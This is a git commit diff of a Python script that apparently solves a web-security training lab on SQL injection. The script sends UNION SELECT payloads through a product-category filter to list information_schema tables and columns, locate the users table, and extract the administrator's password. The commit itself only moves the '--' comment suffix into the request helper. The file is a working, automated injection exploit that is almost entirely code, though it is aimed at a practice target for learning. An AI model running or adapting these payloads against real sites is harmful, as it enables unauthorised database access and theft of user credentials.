4225df042e21274ff9d590acb370368b7aa59e76
Roman Balandin <tinkerscript@yandex.ru>
2023-12-12 20:11:53 +0200

    add common comment chars to SQLi payload

--- sql-injection/05-lab-listing-database-contents-non-oracle/get_users.py
+++ sql-injection/05-lab-listing-database-contents-non-oracle/get_users.py
@@ -5,7 +5,7 @@ from bs4 import BeautifulSoup
 
 
 def request(base, sql_query=''):
-    payload = quote_plus(sql_query) if sql_query else ''
+    payload = f'{quote_plus(sql_query)}--' if sql_query else ''
     response = requests.get(f"{base}/filter?category=Gifts'{payload}", timeout=3)
     return BeautifulSoup(response.text, 'html.parser')
 
@@ -17,18 +17,18 @@ if soup.title.string != 'SQL injection attack, listing the database contents on 
     print('Page title mismatch!')
     sys.exit(1)
 
-soup = request(BASE_URL, ' UNION SELECT table_name, NULL FROM information_schema.tables--')
+soup = request(BASE_URL, ' UNION SELECT table_name, NULL FROM information_schema.tables')
 table_name = next((th.text for th in soup.find_all('th') if th.text.startswith('users')), None)
 print('Users table name is', table_name)
 
 soup = request(BASE_URL, (' UNION SELECT column_name, data_type FROM information_schema.columns '
-                          f"WHERE table_name='{table_name}'--"))
+                          f"WHERE table_name='{table_name}'"))
 username_column_name = next((th.text for th in soup.find_all('th') if th.text.startswith('username')), None)
 password_column_name = next((th.text for th in soup.find_all('th') if th.text.startswith('password')), None)
 
 print('Username column name is', username_column_name)
 print('Password column name is', password_column_name)
 
-soup = request(BASE_URL, f" UNION SELECT {username_column_name}, {password_column_name} FROM {table_name}--")
+soup = request(BASE_URL, f" UNION SELECT {username_column_name}, {password_column_name} FROM {table_name}")
 admin_password = soup.select_one('tr:has(th:-soup-contains("administrator")) td').text
 print('Admin password is', admin_password)
